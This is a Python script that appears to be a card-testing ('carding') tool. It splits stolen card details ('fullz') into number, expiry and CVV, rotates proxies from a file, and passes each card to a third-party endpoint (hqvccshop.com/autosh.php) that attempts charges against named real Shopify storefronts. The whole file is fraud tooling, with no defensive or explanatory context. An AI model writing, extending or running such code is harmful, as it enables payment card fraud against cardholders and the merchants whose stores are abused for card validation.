import asyncio
import random
from fake_useragent import UserAgent # type: ignore
from FUNC.defs import *

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None
    

async def create_shopify_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        random_data         = await get_random_info(session)

        getproxy    = random.choice(open("FILES/proxy.txt", "r", encoding="utf-8").read().splitlines())

        # getsite    = 'https://thesimpleway.myshopify.com/'
        # getsite    = 'https://sammedicalstore.myshopify.com'
        getsite    = 'https://fultonandroark.myshopify.com'



        user_proxy=getproxy
                    

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        response = await session.get(
            f'https://hqvccshop.com/autosh.php?cc={cc}|{mes}|{ano}|{cvv}&site={getsite}&proxy={user_proxy}',
            headers=headers,
        )



        print(response.text)


        return response





        
    except Exception as e:
        return str(e)